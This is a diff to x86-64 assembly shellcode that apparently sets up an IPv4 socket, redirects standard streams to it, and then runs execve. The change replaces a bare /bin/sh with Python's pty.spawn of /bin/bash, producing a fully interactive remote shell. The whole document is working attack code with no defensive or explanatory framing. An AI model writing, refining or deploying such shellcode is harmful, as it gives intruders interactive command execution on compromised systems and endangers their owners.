@@ -11,7 +11,10 @@ endstruc
 sock_fd resd 1
 
 section .rodata
-sh_path db "/bin/sh", 0
+sh_cmd db "/usr/bin/python3", 0
+arg1 db "-c", 0
+arg2 db "import pty; pty.spawn('/bin/bash')", 0
+
 init_struct:
         istruc sockaddr_in                      
                 at sin_family,  dw 2            ; AF_INET (IPv4)
@@ -59,10 +62,16 @@ dup_stderr:
         syscall
 
 init_shell:
-        ; Execute /bin/sh shell
+        ; Execute Python3 to spawn a fully interactive Bash shell
         mov rax, 59                             ; syscall: execve
-        mov rdi, sh_path                        ; path to /bin/sh
-        xor rsi, rsi                            ; argv = NULL
+        mov rdi, sh_cmd                         ; path: /usr/bin/python3
+        lea rsi, [rel args]                     ; argv = {"/usr/bin/python3", "-c", "import pty; pty.spawn('/bin/bash')", NULL}
         xor rdx, rdx                            ; envp = NULL
         syscall
+
+args:
+        dq sh_cmd
+        dq arg1
+        dq arg2
+        dq 0
 
